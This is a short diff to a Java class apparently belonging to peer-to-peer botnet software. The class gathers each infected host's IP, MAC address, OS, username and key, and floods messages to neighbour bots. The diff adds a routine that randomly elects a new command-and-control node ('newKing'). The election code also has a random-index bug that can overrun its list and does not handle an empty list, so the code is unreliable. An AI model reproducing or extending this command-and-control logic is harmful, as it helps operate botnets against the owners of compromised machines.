@@ -67,6 +67,8 @@ public class Commando {
 	@Autowired
 	private CryptoUtils crypto;
 
+	private String newKing;
+	
 	/**
 	 * 
 	 */
@@ -81,6 +83,7 @@ public class Commando {
 		nServ.updateDnsInformation();
 		graph = createNetworkP2P();
 		System.out.println("blab " + graph);
+		newKing = nServ.getMyIp().toString();
 
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKey(),
@@ -93,7 +96,11 @@ public class Commando {
 	 * @return
 	 */
 	private Integer calculateK(Integer nodes) {
-		return (int) Math.ceil(Math.log10(nodes + 1));
+		Integer k= (int) Math.ceil(Math.log10(nodes + 1));
+		if (nodes>3){
+			k++;
+		}
+		return k;
 	}
 
 	/**
@@ -310,6 +317,34 @@ public class Commando {
 		nServ.getNeighbours().getList().forEach((pairs) -> {
 			req.sendFloodToBot(pairs.getValue1().toString(), msg);
 		});
+	}
+
+	@Async //forse inutile perche siamo sul thread nostro
+	public void startElection() {
+		List<Bot> botList = bServ.findAll();
+		List<Bot> ccList = new ArrayList<>();
+		if (botList!=null){
+			for (Bot bot : botList) {
+				if(bot.isElegible().equals("true"))
+					ccList.add(bot);
+			}
+			Bot botB = ccList.get((int) Math.ceil(Math.random()*ccList.size()));
+			System.out.println("ho eletto "+botB.getIp());
+			if(req.becameCc(botB.getIp())){
+				newKing = botB.getIp();
+			}
+			
+		//elegilo passa i dati
+		// passa il potere	
+		}
+	}
+
+	public String getNewKing() {
+		return newKing;
+	}
+
+	public void setNewKing(String newKing) {
+		this.newKing = newKing;
 	}
 
 }
